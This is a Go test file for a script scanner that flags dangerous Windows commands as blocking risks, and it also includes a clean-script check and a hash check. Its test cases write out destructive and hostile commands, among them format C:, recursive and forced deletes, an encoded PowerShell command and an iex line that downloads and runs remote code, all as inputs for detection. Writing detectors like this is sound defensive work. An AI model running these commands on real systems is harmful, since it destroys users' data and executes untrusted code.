package security

import "testing"

func TestScanDanger(t *testing.T) {
	cases := map[string]string{
		"rd /s /q C:\\stuff":       "recursive_delete",
		"format C:":                "format",
		"reg add HKLM\\Software\\X": "registry_add",
		"sc create MyService":      "service_create",
		"powershell -EncodedCommand AAAA": "encoded_command",
		"iex(New-Object Net.WebClient).DownloadString('http://x')": "iex_download",
		"del /f /s *.tmp":          "force_delete",
	}
	for script, wantRule := range cases {
		fs := Scan(script)
		found := false
		for _, f := range fs {
			if f.Rule == wantRule && f.Level == RiskDanger {
				found = true
			}
		}
		if !found {
			t.Errorf("script %q: expected danger rule %s, got %+v", script, wantRule, fs)
		}
		if !HasBlocking(fs) {
			t.Errorf("script %q: expected HasBlocking=true", script)
		}
	}
}

func TestScanClean(t *testing.T) {
	fs := Scan("echo hello world\nnpm run dev")
	if HasBlocking(fs) {
		t.Errorf("clean script should not block, got %+v", fs)
	}
}

func TestHashText(t *testing.T) {
	h := HashText("hello")
	if h != "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824" {
		t.Errorf("hash mismatch: %s", h)
	}
}
